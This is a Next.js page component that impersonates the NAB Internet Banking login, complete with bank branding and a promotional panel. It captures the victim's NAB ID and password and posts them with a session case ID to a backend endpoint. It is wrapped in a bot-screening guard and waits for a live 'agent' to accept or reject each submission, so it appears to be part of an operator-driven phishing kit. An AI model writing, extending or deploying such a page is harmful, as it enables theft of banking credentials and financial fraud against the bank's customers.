'use client';

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [nabId, setNabId] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setNabId('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!nabId.trim()) {
        setFieldError('Please enter your NAB ID');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: nabId.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [nabId, password, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="card-heading">NAB Internet Banking</h1>

        <form className="login-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="nab-id">NAB ID</label>
            <input
              type="text"
              id="nab-id"
              name="nab-id"
              autoComplete="username"
              value={nabId}
              onChange={(e) => {
                setNabId(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          <div className="form-group">
            <label htmlFor="password">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              autoComplete="current-password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {fieldError && (
            <div className="form-group">
              <div style={{ color: '#C20000', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px' }}>
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            </div>
          )}
          {(error && !fieldError) && (
            <div className="form-group">
              <div style={{ color: '#C20000', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px' }}>
                <AlertCircle className="h-4 w-4" />
                <span>{error}</span>
              </div>
            </div>
          )}

          <div className="form-actions">
            <button type="submit" className="btn-login" disabled={isWaiting}>
              {isWaiting ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Loader2 className="h-4 w-4 animate-spin" /> Logging in...
                </span>
              ) : 'Log in'}
            </button>
          </div>

          <div className="form-links">
            <a href="#" className="forgot-link">Forgotten your Login ID or password?</a>
          </div>
        </form>

        <div className="card-footer">
          <p>New to NAB Internet Banking?</p>
          <a href="#" className="register-link">Register now</a>
        </div>
      </div>

      <div className="promo-section">
        <div className="promo-content">
          <h2>$0 monthly account fees</h2>
          <p>More money in your pocket to enjoy what you really love with a NAB Classic Banking account.</p>
          <p className="small-text">Consider the terms and conditions & TMD.</p>
          <a href="#" className="btn-learn-more">Learn more</a>
        </div>
        <div className="promo-image">
          <img src="/brands/nab/red-star-decorative-iblogout-500x500.avif" alt="NAB Star" />
        </div>
      </div>
    </BotGuard>
  );
}
